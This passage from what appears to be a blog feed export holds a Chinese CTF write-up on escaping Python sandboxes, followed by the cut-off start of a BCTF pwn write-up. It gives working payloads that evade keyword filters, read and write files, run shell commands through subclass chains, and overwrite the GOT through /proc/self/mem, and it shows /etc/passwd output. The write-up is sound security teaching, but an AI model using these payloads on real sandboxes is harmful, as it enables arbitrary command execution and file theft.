class="string">&#x27;SyntaxWarning&#x27;</span>, <span class="string">&#x27;SystemError&#x27;</span>, <span class="string">&#x27;SystemExit&#x27;</span>, <span class="string">&#x27;TabError&#x27;</span>, <span class="string">&#x27;True&#x27;</span>, <span class="string">&#x27;TypeError&#x27;</span>, <span class="string">&#x27;UnboundLocalError&#x27;</span>, <span class="string">&#x27;UnicodeDecodeError&#x27;</span>, <span class="string">&#x27;UnicodeEncodeError&#x27;</span>, <span class="string">&#x27;UnicodeError&#x27;</span>, <span class="string">&#x27;UnicodeTranslateError&#x27;</span>, <span class="string">&#x27;UnicodeWarning&#x27;</span>, <span class="string">&#x27;UserWarning&#x27;</span>, <span class="string">&#x27;ValueError&#x27;</span>, <span class="string">&#x27;Warning&#x27;</span>, <span class="string">&#x27;ZeroDivisionError&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;__debug__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;all&#x27;</span>, <span class="string">&#x27;any&#x27;</span>, <span class="string">&#x27;apply&#x27;</span>, <span class="string">&#x27;basestring&#x27;</span>, <span class="string">&#x27;bin&#x27;</span>, <span class="string">&#x27;bool&#x27;</span>, <span class="string">&#x27;buffer&#x27;</span>, <span class="string">&#x27;bytearray&#x27;</span>, <span class="string">&#x27;bytes&#x27;</span>, <span class="string">&#x27;callable&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;classmethod&#x27;</span>, <span class="string">&#x27;cmp&#x27;</span>, <span class="string">&#x27;coerce&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;complex&#x27;</span>, <span class="string">&#x27;copyright&#x27;</span>, <span class="string">&#x27;credits&#x27;</span>, <span class="string">&#x27;delattr&#x27;</span>, <span class="string">&#x27;dict&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;divmod&#x27;</span>, <span class="string">&#x27;enumerate&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;float&#x27;</span>, <span class="string">&#x27;format&#x27;</span>, <span class="string">&#x27;frozenset&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;hasattr&#x27;</span>, <span class="string">&#x27;hash&#x27;</span>, <span class="string">&#x27;help&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>, <span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;intern&#x27;</span>, <span class="string">&#x27;isinstance&#x27;</span>, <span class="string">&#x27;issubclass&#x27;</span>, <span class="string">&#x27;iter&#x27;</span>, <span class="string">&#x27;len&#x27;</span>, <span class="string">&#x27;license&#x27;</span>, <span class="string">&#x27;list&#x27;</span>, <span class="string">&#x27;locals&#x27;</span>, <span class="string">&#x27;long&#x27;</span>, <span class="string">&#x27;map&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;memoryview&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;next&#x27;</span>, <span class="string">&#x27;object&#x27;</span>, <span class="string">&#x27;oct&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;ord&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;property&#x27;</span>, <span class="string">&#x27;quit&#x27;</span>, <span class="string">&#x27;range&#x27;</span>, <span class="string">&#x27;raw_input&#x27;</span>, <span class="string">&#x27;reduce&#x27;</span>, <span class="string">&#x27;reload&#x27;</span>, <span class="string">&#x27;repr&#x27;</span>, <span class="string">&#x27;reversed&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;set&#x27;</span>, <span class="string">&#x27;setattr&#x27;</span>, <span class="string">&#x27;slice&#x27;</span>, <span class="string">&#x27;sorted&#x27;</span>, <span class="string">&#x27;staticmethod&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;sum&#x27;</span>, <span class="string">&#x27;super&#x27;</span>, <span class="string">&#x27;tuple&#x27;</span>, <span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;unichr&#x27;</span>, <span class="string">&#x27;unicode&#x27;</span>, <span class="string">&#x27;vars&#x27;</span>, <span class="string">&#x27;xrange&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>]</span><br></pre></td></tr></table></figure><p>åœ¨Pythonä¸­ï¼Œä¸å¼•å…¥ç›´æ¥ä½¿ç”¨çš„å†…ç½®å‡½æ•°è¢«æˆä¸º<strong>builtin</strong>å‡½æ•°ï¼Œéšç€<strong><strong>builtin</strong></strong>è¿™ä¸ªæ¨¡å—è‡ªåŠ¨å¼•å…¥åˆ°ç¯å¢ƒä¸­</p><p>è¿›è€Œï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>__dict__</code>å¼•å…¥æˆ‘ä»¬æƒ³è¦å¼•å…¥çš„æ¨¡å—</p><p>ä¸¤ç§æ–¹æ³•éƒ½æ˜¯ä¸€ä¸ªç›®çš„,é‚£å°±æ˜¯åˆ—å‡ºä¸€ä¸ªæ¨¡ç»„/ç±»/å¯¹è±¡ ä¸‹é¢ æ‰€æœ‰çš„å±æ€§å’Œå‡½æ•°<br>è¿™åœ¨æ²™ç›’é€ƒé€¸ä¸­æ˜¯å¾ˆæœ‰ç”¨çš„,å¯ä»¥æ‰¾åˆ°éšè—åœ¨å…¶ä¸­çš„ä¸€äº›ä¸œè¥¿<br>æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>__dict__</code>åšä»€ä¹ˆå‘¢ï¼Ÿ<br>ä¸€ä¸ªæ¨¡å—å¯¹è±¡æœ‰ä¸€ä¸ªç”±å­—å…¸å¯¹è±¡å®ç°çš„å‘½åç©ºé—´â€¦å±æ€§å¼•ç”¨è¢«è½¬æ¢ä¸ºè¿™ä¸ªå­—å…¸ä¸­çš„æŸ¥æ‰¾ï¼Œä¾‹å¦‚ï¼Œm.xç­‰åŒäºm.dict[â€œxâ€]</p><p>ç»•è¿‡å®ä¾‹ï¼š<br>é¦–å…ˆé€šè¿‡ base64 ç»•è¿‡å­—ç¬¦æ˜æ–‡æ£€æµ‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;__import__&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;b3M=&#x27;</span></span><br></pre></td></tr></table></figure><p>ç„¶åé€šè¿‡<strong><strong>dict</strong></strong>å¼•ç”¨</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)](<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>))</span><br></pre></td></tr></table></figure><p><em>å¦‚æœä¸€äº› å†…æ•›å‡½æ•°åœ¨<strong>builtins__åˆ é™¤ ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>reload(__builtins__)</code>é‡æ–°è½½å…¥è·å–ä¸€ä¸ªå®Œæ•´çš„__builtins</strong></em></p><h5 id="åˆ›å»ºå¯¹è±¡ï¼Œä»¥åŠå¼•ç”¨"><a href="#åˆ›å»ºå¯¹è±¡ï¼Œä»¥åŠå¼•ç”¨" class="headerlink" title="åˆ›å»ºå¯¹è±¡ï¼Œä»¥åŠå¼•ç”¨"></a>åˆ›å»ºå¯¹è±¡ï¼Œä»¥åŠå¼•ç”¨</h5><p>pythonçš„objectç±»ä¸­é›†æˆäº†å¾ˆå¤šçš„åŸºç¡€å‡½æ•°ï¼Œæˆ‘ä»¬æƒ³è¦è°ƒç”¨çš„æ—¶å€™ä¹Ÿæ˜¯å¯ä»¥é€šè¿‡åˆ›å»ºå¯¹è±¡è¿›è€Œå¼•ç”¨</p><p>æœ‰å¸¸è§çš„ä¸¤ä¸ªæ–¹æ³•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0]</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[2]</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/python-sanbox-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/python-sanbox-01.jpg"></a></p><p>å¦‚ï¼Œæˆ‘ä»¬å¯é€šè¿‡<br><code>print ().__class__.__bases__[0].__subclasses__()[40](&quot;/etc/services&quot;).read()</code>è¾¾åˆ°æ–‡ä»¶è¯»å–çš„æ•ˆæœï¼Œ</p><p><strong>å¸¸è§payload</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#è¯»æ–‡ä»¶</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r&#x27;C:\1.php&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment">#å†™æ–‡ä»¶</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/var/www/html/input&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‰§è¡Œä»»æ„å‘½ä»¤</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )</span><br></pre></td></tr></table></figure><h5 id="å…¶ä»–å±é™©çš„å‡½æ•°"><a href="#å…¶ä»–å±é™©çš„å‡½æ•°" class="headerlink" title="å…¶ä»–å±é™©çš„å‡½æ•°"></a>å…¶ä»–å±é™©çš„å‡½æ•°</h5><p>å¦‚<strong>execfile</strong>æ–‡ä»¶æ‰§è¡Œ</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>execfile(<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>system(<span class="string">&#x27;cat /etc/passwd&#x27;</span>)</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/bin/bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:<span class="number">2</span>:<span class="number">2</span>:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:/dev:/usr/sbin/nologin</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getcwd()</span><br><span class="line"><span class="string">&#x27;/usr/lib/python2.7&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>timeit</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><strong>exec å’Œeval æ¯”è¾ƒç»å…¸äº†</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eval(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>platform</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">print</span> platform.popen(<span class="string">&#x27;dir&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h5 id="getattr-å’Œ-getattribute"><a href="#getattr-å’Œ-getattribute" class="headerlink" title="getattr() å’Œ getattribute()"></a><strong>getattr</strong>() å’Œ <strong>getattribute</strong>()</h5><p>python å†è®¿é—®å±æ€§çš„æ–¹æ³•ä¸Šå®šä¹‰äº†<strong>getattr</strong>() å’Œ <strong>getattribute</strong>() 2ç§æ–¹æ³•ï¼Œå…¶åŒºåˆ«éå¸¸ç»†å¾®ï¼Œä½†éå¸¸é‡è¦ã€‚</p><p>å¦‚æœæŸä¸ªç±»å®šä¹‰äº† <strong>getattribute</strong>() æ–¹æ³•ï¼Œåœ¨ æ¯æ¬¡å¼•ç”¨å±æ€§æˆ–æ–¹æ³•åç§°æ—¶ Python éƒ½è°ƒç”¨å®ƒï¼ˆç‰¹æ®Šæ–¹æ³•åç§°é™¤å¤–ï¼Œå› ä¸ºé‚£æ ·å°†ä¼šå¯¼è‡´è®¨åŒçš„æ— é™å¾ªç¯ï¼‰ã€‚<br>å¦‚æœæŸä¸ªç±»å®šä¹‰äº† <strong>getattr</strong>() æ–¹æ³•ï¼ŒPython å°†åªåœ¨æ­£å¸¸çš„ä½ç½®æŸ¥è¯¢å±æ€§æ—¶æ‰ä¼šè°ƒç”¨å®ƒã€‚å¦‚æœå®ä¾‹ x å®šä¹‰äº†å±æ€§ colorï¼Œ x.color å°† ä¸ä¼š è°ƒç”¨x.<strong>getattr</strong>(â€˜colorâ€™)ï¼›è€Œåªä¼šè¿”å› x.color å·²å®šä¹‰å¥½çš„å€¼ã€‚<br>è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡__getattribute__è¿™ä¸ªæ–¹æ³•åšä¸€äº›äº‹ï¼Œå¦‚ä¸‹é¢çš„payload</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = [x <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">&#x27;ca&#x27;</span>+<span class="string">&#x27;tch_warnings&#x27;</span>][<span class="number">0</span>].__init__</span><br><span class="line">x.__getattribute__(<span class="string">&quot;func_global&quot;</span>+<span class="string">&quot;s&quot;</span>)[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;l&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="é—´æ¥çš„å¼•ç”¨è°ƒç”¨"><a href="#é—´æ¥çš„å¼•ç”¨è°ƒç”¨" class="headerlink" title="é—´æ¥çš„å¼•ç”¨è°ƒç”¨"></a>é—´æ¥çš„å¼•ç”¨è°ƒç”¨</h4><p>åœ¨æœ‰äº›é¢˜ç›®ä¸­ï¼Œå¦‚è¿™æ¬¡çš„2018å¹´å›½èµ›çš„Pythonæ²™ç›’é¢˜ç›®ä¸Šï¼Œimport å…¶å®æ•´ä¸ªæ˜¯è¢«é˜‰å‰²äº†ã€‚</p><p>ä½†æ˜¯åœ¨Pythonä¸­ï¼ŒåŸç”Ÿçš„<strong><strong>import</strong></strong>æ˜¯å­˜åœ¨è¢«å¼•ç”¨çš„ï¼Œåªè¦æˆ‘ä»¬æ‰¾åˆ°ç›¸å…³å¯¹è±¡å¼•ç”¨å°±å¯ä»¥è¿›ä¸€æ­¥è·å–æˆ‘ä»¬æƒ³è¦çš„å†…å®¹ï¼Œå…·ä½“ä¸‹é¢çš„demoä¼šè®²è¿°åˆ°</p><h4 id="writeä¿®æ”¹gotè¡¨"><a href="#writeä¿®æ”¹gotè¡¨" class="headerlink" title="writeä¿®æ”¹gotè¡¨"></a>writeä¿®æ”¹gotè¡¨</h4><p>å®é™…ä¸Šæ˜¯ä¸€ä¸ª**/proc/self/mem<strong>çš„å†…å­˜æ“ä½œæ–¹æ³•<br>**/proc/self/mem</strong>æ˜¯å†…å­˜é•œåƒï¼Œèƒ½å¤Ÿé€šè¿‡å®ƒæ¥è¯»å†™åˆ°è¿›ç¨‹çš„æ‰€æœ‰å†…å­˜ï¼ŒåŒ…æ‹¬å¯æ‰§è¡Œä»£ç ï¼Œå¦‚æœæˆ‘ä»¬èƒ½è·å–åˆ°Pythonä¸€äº›å‡½æ•°çš„åç§»ï¼Œå¦‚<strong>system</strong>ï¼Œæˆ‘ä»¬å°±èƒ½é€šè¿‡æƒ³åšpwné¢˜çš„åŠ«æŒgotè¡¨åšæˆ‘ä»¬ä»»æ„æƒ³åšçš„äº‹æƒ…</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">lambda</span> r,w:r.seek(<span class="number">0x08de2b8</span>) <span class="keyword">or</span> w.seek(<span class="number">0x08de8c8</span>) <span class="keyword">or</span> w.write(r.read(<span class="number">8</span>)) <span class="keyword">or</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb&#x27;</span>))(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/proc/self/mem&#x27;</span>,<span class="string">&#x27;r&#x27;</span>),().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/proc/self/mem&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªåœ°å€æ˜¯systemçš„åç§»ï¼Œç¬¬äºŒä¸ªæ˜¯fopençš„åç§»ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<strong>objdump</strong>è·å–ç›¸å…³ä¿¡æ¯</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/python-sanxbox-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/python-sanxbox-02.jpg"></a></p><h2 id="å…³äºè¿™æ¬¡çš„é¢˜ç›®"><a href="#å…³äºè¿™æ¬¡çš„é¢˜ç›®" class="headerlink" title="å…³äºè¿™æ¬¡çš„é¢˜ç›®"></a>å…³äºè¿™æ¬¡çš„é¢˜ç›®</h2><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡<br><code>print ().__class__.__bases__[0].__subclasses__()[40](&quot;/home/ctf/sandbox.py&quot;).read()</code><br>è·å–é¢˜ç›®æºç ï¼Œç„¶åè¿›ä¸€æ­¥åˆ†æ</p><h3 id="è§£å†³"><a href="#è§£å†³" class="headerlink" title="è§£å†³"></a>è§£å†³</h3><p>ä¸‰ç§æ–¹æ³•</p><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = [x <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">&#x27;ca&#x27;</span>+<span class="string">&#x27;tch_warnings&#x27;</span>][<span class="number">0</span>].__init__</span><br><span class="line">x.__getattribute__(<span class="string">&quot;func_global&quot;</span>+<span class="string">&quot;s&quot;</span>)[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;l&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">x.__getattribute__(<span class="string">&quot;func_global&quot;</span>+<span class="string">&quot;s&quot;</span>)[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;l&#x27;</span>+<span class="string">&#x27;s /home/ctf&#x27;</span>)</span><br><span class="line">x.__getattribute__(<span class="string">&quot;func_global&quot;</span>+<span class="string">&quot;s&quot;</span>)[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;ca&#x27;</span>+<span class="string">&#x27;t /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><p>ä¿®æ”¹got</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">lambda</span> r,w:r.seek(<span class="number">0x08de2b8</span>) <span class="keyword">or</span> w.seek(<span class="number">0x08de8c8</span>) <span class="keyword">or</span> w.write(r.read(<span class="number">8</span>)) <span class="keyword">or</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;l&#x27;</span>+<span class="string">&#x27;s /home/ctf/&#x27;</span>))(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/proc/self/mem&#x27;</span>,<span class="string">&#x27;r&#x27;</span>),().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/proc/self/mem&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(<span class="keyword">lambda</span> r,w:r.seek(<span class="number">0x08de2b8</span>) <span class="keyword">or</span> w.seek(<span class="number">0x08de8c8</span>) <span class="keyword">or</span> w.write(r.read(<span class="number">8</span>)) <span class="keyword">or</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb&#x27;</span>))(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/proc/self/mem&#x27;</span>,<span class="string">&#x27;r&#x27;</span>),().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/proc/self/mem&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="number">0</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4><p>é—´æ¥å¼•ç”¨<br>åœ¨ä¸æ–­çš„dirè¿‡ç¨‹ä¸­ï¼Œå‘ç°<strong>closure</strong> è¿™ä¸ªobjectä¿å­˜äº†å‚æ•°ï¼Œå¯ä»¥å¼•ç”¨åŸç”Ÿçš„<strong>import</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> __import__.__getattribute__(<span class="string">&#x27;__clo&#x27;</span>+<span class="string">&#x27;sure__&#x27;</span>)[<span class="number">0</span>].cell_contents(<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).__getattribute__(<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>)(<span class="string">&#x27;l&#x27;</span>+<span class="string">&#x27;s home&#x27;</span>) </span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://xz.aliyun.com/t/52#toc-10">https://xz.aliyun.com/t/52#toc-10</a><br><a href="https://blog.csdn.net/qq_35078631/article/details/78504415">https://blog.csdn.net/qq_35078631/article/details/78504415</a><br><a href="https://www.anquanke.com/post/id/85571">https://www.anquanke.com/post/id/85571</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> py_sandbox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BCTF é‡Œçš„ä¸€ä¸ªç®€å•Pwné¢˜</title>
      <link href="BCTF-part-pwn.html"/>
      <url>BCTF-part-pwn.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="https://mega.nz/#!XupFhJYb!TOn6FloGkRJs9acQDoes2SO9-8TZ3-9A69qbpnuG0wM">bin ä¸‹è½½é“¾æ¥</a><br>è¿™ä¸ªé¢˜é€šè¿‡è¦†å†™fsï¼Œæ”¹å†™canaryçš„å€¼</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/fs.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/fs.jpg"></a></p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>é¢˜ç›®ä¿æŠ¤å…¨å¼€ï¼Œæœ‰ä¸‰ä¸ªåŠŸèƒ½ï¼Œä½†ä»…èƒ½ä½¿ç”¨ä¸€æ¬¡<br> (F)ormat String Bug<br>(A)rbitrary Write<br>(S)tack Overflow<br>(E)xit</p><h3 id="åŠŸèƒ½-F"><a href="#åŠŸèƒ½-F" class="headerlink" title="åŠŸèƒ½ F"></a>åŠŸèƒ½ F</h3><p>ä¸€ä¸ªæ ¼å¼å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†æ˜¯ç”¨çš„æ˜¯printf_chk æ‰€ä»¥åªèƒ½åšæ³„æ¼</p><h3 id="åŠŸèƒ½-A"><a href="#åŠŸèƒ½-A" class="headerlink" title="åŠŸèƒ½ A"></a>åŠŸèƒ½ A</h3><p>ä¸€ä¸ªéå¯æ§çš„ä»»æ„åœ°å€å†™</p><h3 id="åŠŸèƒ½-S"><a href="#åŠŸèƒ½-S" class="headerlink" title="åŠŸèƒ½ S"></a>åŠŸèƒ½ S</h3><p>æ ˆæº¢å‡ºï¼Œä½†æ˜¯æœ‰00æˆªæ–­</p><h2 id="è¿‡ç¨‹ï¼Œ"><a href="#è¿‡ç¨‹ï¼Œ" class="headerlink" title="è¿‡ç¨‹ï¼Œ"></a>è¿‡ç¨‹ï¼Œ</h2><p>ä¸€å¼€å§‹é€šè¿‡ åŠŸèƒ½Fæ³„æ¼å„ç§ä¸œè¥¿ï¼Œç„¶è€Œåˆ°å¤å†™canaryçš„æ—¶å€™å‘ç°æœ‰æˆªæ–­ã€‚è´¼å°´å°¬ã€‚åé¢æƒ³èµ·æ¥åŠŸèƒ½Aå¯ä»¥å†™ä¸œè¥¿ã€‚æ‰€ä»¥åˆ©ç”¨åŠŸèƒ½Aå»å†™ fsçš„canaryå†…å®¹ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bctf-pwn-01.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bctf-pwn-01.png"></a></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 